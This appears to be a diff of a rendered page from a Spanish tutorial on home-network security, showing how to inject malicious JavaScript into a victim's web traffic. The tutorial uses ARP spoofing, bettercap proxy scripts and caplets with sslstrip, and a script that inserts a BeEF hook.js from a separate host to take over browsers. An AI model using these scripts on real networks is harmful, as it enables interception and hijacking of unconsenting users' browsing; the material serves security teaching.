@@ -2,7 +2,7 @@
 
 
 
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en" class="no-js">
   <head>
     
@@ -10,7 +10,11 @@
       <meta name="viewport" content="width=device-width,initial-scale=1">
       <meta http-equiv="x-ua-compatible" content="ie=edge">
       
+        <meta name="description" content="Análisis de las vulnerabilidades presentes en un entorno doméstico">
       
+      
+      
+        <meta name="author" content="Héctor Romero <i72roloh@uco.es>">
       
       
         <meta name="lang:clipboard.copy" content="Copy to clipboard">
@@ -32,20 +36,20 @@
         <meta name="lang:search.tokenizer" content="[\s\-]+">
       
       <link rel="shortcut icon" href="../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.0.2">
     
     
       
-        <title>POC: Inyectando Javscript Malicioso - Hacking Doméstico</title>
+        <title>POC: Inyectando Javascript Malicioso - Seguridad en redes domésticas</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/application.11e41852.css">
+      <link rel="stylesheet" href="../assets/stylesheets/application.982221ab.css">
       
       
     
     
-      <script src="../assets/javascripts/modernizr.20ef595d.js"></script>
+      <script src="../assets/javascripts/modernizr.1f0bcf2b.js"></script>
     
     
       
@@ -56,6 +60,9 @@
     
     <link rel="stylesheet" href="../assets/fonts/material-icons.css">
     
+    
+    
+      
     
     
   </head>
@@ -81,7 +88,7 @@
   <nav class="md-header-nav md-grid">
     <div class="md-flex">
       <div class="md-flex__cell md-flex__cell--shrink">
-        <a href=".." title="Hacking Doméstico" class="md-header-nav__button md-logo">
+        <a href=".." title="Seguridad en redes domésticas" class="md-header-nav__button md-logo">
           
             <i class="md-icon"></i>
           
@@ -93,22 +100,19 @@
       <div class="md-flex__cell md-flex__cell--stretch">
         <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
           
-            
-              <span class="md-header-nav__topic">
-                Hacking Doméstico
-              </span>
-              <span class="md-header-nav__topic">
-                POC: Inyectando Javscript Malicioso
-              </span>
-            
+            <span class="md-header-nav__topic">
+              Seguridad en redes domésticas
+            </span>
+            <span class="md-header-nav__topic">
+              POC: Inyectando Javascript Malicioso
+            </span>
           
         </div>
       </div>
       <div class="md-flex__cell md-flex__cell--shrink">
         
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
           
-            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
-            
 <div class="md-search" data-md-component="search" role="dialog">
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
@@ -131,7 +135,6 @@
     </div>
   </div>
 </div>
-          
         
       </div>
       
@@ -153,12 +156,12 @@
                   <div class="md-sidebar__inner">
                     <nav class="md-nav md-nav--primary" data-md-level="0">
   <label class="md-nav__title md-nav__title--site" for="__drawer">
-    <a href=".." title="Hacking Doméstico" class="md-nav__button md-logo">
+    <a href=".." title="Seguridad en redes domésticas" class="md-nav__button md-logo">
       
         <i class="md-icon"></i>
       
     </a>
-    Hacking Doméstico
+    Seguridad en redes domésticas
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -169,8 +172,8 @@
 
 
   <li class="md-nav__item">
-    <a href=".." title="Index" class="md-nav__link">
-      Index
+    <a href=".." title="Inicio" class="md-nav__link">
+      Inicio
     </a>
   </li>
 
@@ -241,8 +244,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../networkAttack/" title="Explorando la red interna" class="md-nav__link">
-      Explorando la red interna
+    <a href="../networkAttack/" title="Atacando la red interna" class="md-nav__link">
+      Atacando la red interna
     </a>
   </li>
 
@@ -262,11 +265,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        POC: Inyectando Javscript Malicioso
+        POC: Inyectando Javascript Malicioso
       </label>
     
-    <a href="./" title="POC: Inyectando Javscript Malicioso" class="md-nav__link md-nav__link--active">
-      POC: Inyectando Javscript Malicioso
+    <a href="./" title="POC: Inyectando Javascript Malicioso" class="md-nav__link md-nav__link--active">
+      POC: Inyectando Javascript Malicioso
     </a>
     
       
@@ -355,41 +358,65 @@
               
                 
                 
-                <h1 id="poc-inyectar-javascript-malicioso">POC: Inyectar Javascript malicioso</h1>
+                <h1 id="poc-inyectar-javascript-malicioso">POC: Inyectar Javascript malicioso<a class="headerlink" href="#poc-inyectar-javascript-malicioso" title="Permanent link">&para;</a></h1>
 <p>Javascript es un lenguaje de programación utilizado en programación web que se ejecuta de lado del cliente, es decir, cualquier acción realizada en Javascript tendrá un reflejo en los equipos de aquellas personas que visiten la página web.</p>
 <p>Aprovechando esta caracterísitca de Javascript podemos inyectar un fichero Javascript (que contiene código malicioso) dentro de las peticiones HTTP para poder realizar diferentes acciones (<a href="https://www.europapress.es/portaltic/internet/noticia-the-pirate-bay-utiliza-cpu-usuarios-deshacerse-anuncios-mineria-criptomoneda-20170918140205.html">como minar criptomonedas</a>)</p>
-<h2 id="inyeccion-de-javascript">Inyección de Javascript</h2>
+<h2 id="inyeccion-de-javascript">Inyección de Javascript<a class="headerlink" href="#inyeccion-de-javascript" title="Permanent link">&para;</a></h2>
 <p>Para poder inyectar Javascript dentro de las peticiones, tendremos que realizar un ataque de arp spoofing, de forma que podemos realizar tratamiento de dichos paquetes.</p>
-<p>Posteiormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas.</p>
+<p>Posteriormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas.</p>
 <p>Para poder modificar las peticiones usaremos el proxy http de bettercap. En primer lugar usaremos un código Javascript de ejemplo.</p>
-<pre><code>function onLoad(){
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>function onLoad(){
    log(&quot;Script loaded..&quot;);
 }
 
 function onResponse(req,res){
 
- if (res.ContentType.indexOf('text/html') == 0){
+ if (res.ContentType.indexOf(&#39;text/html&#39;) == 0){
 
     var body = res.ReadBody();
 
      res.Body = body.replace(
-     '&lt;/head&gt;',
-     '&lt;script type=&quot;text/javascript&quot;&gt;alert(\&quot;@cyberh99 wa    s here\&quot;)&lt;/script&gt;&lt;/head&gt;'
+     &#39;&lt;/head&gt;&#39;,
+     &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(\&quot;@cyberh99 wa    s here\&quot;)&lt;/script&gt;&lt;/head&gt;&#39;
      );
     }
 
-}        
-</code></pre>
+}
+</pre></div>
+</td></tr></table>
 
-<p><a href="">injectionJS.js</a></p>
-<p>Este código Javascript realiza una acción muy sencilla, se encarga de reemplarar la etiqueta <em>head</em> del código html de cualquier página agregando una sencilla ventana que dice "@cyberh99 was here". Con esto podemos comprobar como funcionala inyección de Javascript.</p>
+<p><a href="https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionJS.js">injectionJS.js</a></p>
+<p>Este código Javascript realiza una acción muy sencilla, se encarga de reemplazar la etiqueta <em>head</em> del código html de cualquier página agregando una sencilla ventana que dice "@cyberh99 was here". Con esto podemos comprobar como funcionala inyección de Javascript.</p>
 <p>Dentro del código encontramos dos funciones, las cuales <em>tienen que estar para el funcionamiento del script</em>, estas tienen la siguiente relevancia:</p>
 <ul>
 <li>onLoad() --&gt; Se ejecuta cuando el script se cargca</li>
 <li>onResponse(req,res) --&gt; Se ejecuta una vez se envía el paquete al servidor real y se recibe respuesta</li>
 </ul>
 <p>Una vez que tenemos el código Javascript malicioso simplemente crearemos nuestro caplet para ejecutar Bettercap:</p>
-<pre><code>set http.proxy.script injectionJS.js
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>set http.proxy.script injectionJS.js
 set https.proxy.script injectionJS.js
 
 set http.proxy.sslstrip true
@@ -397,34 +424,62 @@ set https.proxy.sslstrip true
 
 http.proxy on
 https.proxy on
+</pre></div>
+</td></tr></table>
 
-</code></pre>
-
-<p><a href="">injectionTest.cap</a></p>
-<h2 id="beef-browser-explotation-framework">Beef: Browser Explotation Framework</h2>
+<p><a href="https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionTest.cap">injectionTest.cap</a></p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Existen extensiones para los diferentes navegadores como Firefox y Google Chrome que permite deshabilitar Javascript de las diferentes páginas web, habilitando exclusivamente aquellos que sean de confianza.</p>
+<p>Entre las diferentes opciones, la más usada y recomendad es <a href="https://noscript.net/">noScript</a></p>
+</div>
+<h2 id="beef-browser-explotation-framework">Beef: Browser Explotation Framework<a class="headerlink" href="#beef-browser-explotation-framework" title="Permanent link">&para;</a></h2>
 <p>El código Javascript que hemos inyectado es muy simple, para una mera demostración, sin embargo, podemos hacer cosas mucho más complejas, un ejemplo de ello es Beef.</p>
 <p>Beef (Browser Explotation Framework) es una herramienta que nos ofrece la opción de infectar diferentes navegadores con código javascript, de forma que podamos realizar acciones sobre la máquina infectada. Este framework puede estar conectado con Metasploit o ser utilizado para ingenieria social.</p>
 <p>Para poder inyectar el códgio javascript de beef utilizaremos el siguiente código:</p>
-<pre><code class="javascript">function onLoad() {
-    log( &quot;BeefInject loaded.&quot; );
-    log(&quot;targets: &quot; + env['arp.spoof.targets']);
-}
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">onLoad</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">log</span><span class="p">(</span> <span class="s2">&quot;BeefInject loaded.&quot;</span> <span class="p">);</span>
+    <span class="nx">log</span><span class="p">(</span><span class="s2">&quot;targets: &quot;</span> <span class="o">+</span> <span class="nx">env</span><span class="p">[</span><span class="s1">&#39;arp.spoof.targets&#39;</span><span class="p">]);</span>
+<span class="p">}</span>
 
-function onResponse(req, res) {
-    if( res.ContentType.indexOf('text/html') == 0 ){
-        var body = res.ReadBody();
-        if( body.indexOf('&lt;/head&gt;') != -1 ) {
-            res.Body = body.replace( 
-                '&lt;/head&gt;', 
-                '&lt;script type=&quot;text/javascript&quot; src=&quot;http://10.0.2.15:3000/hook.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;' 
-            ); 
-        }
-    }
-}
-</code></pre>
+<span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span> <span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">){</span>
+        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span> <span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
+                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
+                <span class="s1">&#39;&lt;script type=&quot;text/javascript&quot; src=&quot;http://10.0.2.15:3000/hook.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
+            <span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></table>
 
-<p><a href="">beefJavascript.js</a></p>
-<pre><code>set http.proxy.script beefJavascript.js
+<p><a href="https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefJavascript.js">beefJavascript.js</a></p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>set http.proxy.script beefJavascript.js
 set https.proxy.script beefJavascript.js
 
 set http.proxy.sslstrip true
@@ -432,9 +487,10 @@ set https.proxy.sslstrip true
 
 http.proxy on
 https.proxy on
-</code></pre>
+</pre></div>
+</td></tr></table>
 
-<p><a href="">beefInjection.cap</a></p>
+<p><a href="https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefInjection.cap">beefInjection.cap</a></p>
 <p>Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotación.</p>
                 
                   
@@ -456,7 +512,7 @@ https.proxy on
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../networkAttack/" title="Explorando la red interna" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../networkAttack/" title="Atacando la red interna" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -465,7 +521,7 @@ https.proxy on
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                Explorando la red interna
+                Atacando la red interna
               </span>
             </div>
           </a>
@@ -485,20 +541,15 @@ https.proxy on
           Material for MkDocs</a>
       </div>
       
-        
-      
     </div>
   </div>
 </footer>
       
     </div>
     
-      <script src="../assets/javascripts/application.9e1f3b71.js"></script>
+      <script src="../assets/javascripts/application.d9aa80ab.js"></script>
       
       <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
-      
-    
-    
       
     
   </body>
